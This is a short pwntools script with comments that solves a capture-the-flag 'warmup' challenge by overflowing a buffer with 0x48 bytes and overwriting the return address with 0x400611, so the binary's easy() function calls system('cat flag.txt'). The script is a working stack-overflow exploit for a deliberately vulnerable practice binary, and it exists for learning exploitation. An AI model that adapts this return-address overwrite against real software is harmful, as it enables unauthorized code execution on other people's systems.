# to solve, we can just execute: ./warmup < payload.txt
# i did:
# payload = b"A"*0x48 + p64(0x400611)
# with open("payload.txt", "wb") as f:
#     f.write(payload)

from pwn import *
import sys

target = process('./warmup', stdout=sys.stdout.fileno())

# Make the payload
payload = b"A"*0x48 + p64(0x400611) # Overflow the buffer up to the return address 

# Send the payload
target.sendline(payload)

target.interactive()

# I tried to jump to the beginning of the easy() function at 0x40060d, but it did not work (got Segmentation fault)
# after a lot of thinking I tried to jump to 0x400611, where the argument edi="cat flag.txt" is set and then system() is called
# this works!
# The easy() function disassembly is:
# => 0x40060d <easy>:     push   rbp
#    0x40060e <easy+1>:   mov    rbp,rsp
#    0x400611 <easy+4>:   mov    edi,0x400734
#    0x400616 <easy+9>:   call   0x4004d0 <system@plt>
#    0x40061b <easy+14>:  pop    rbp
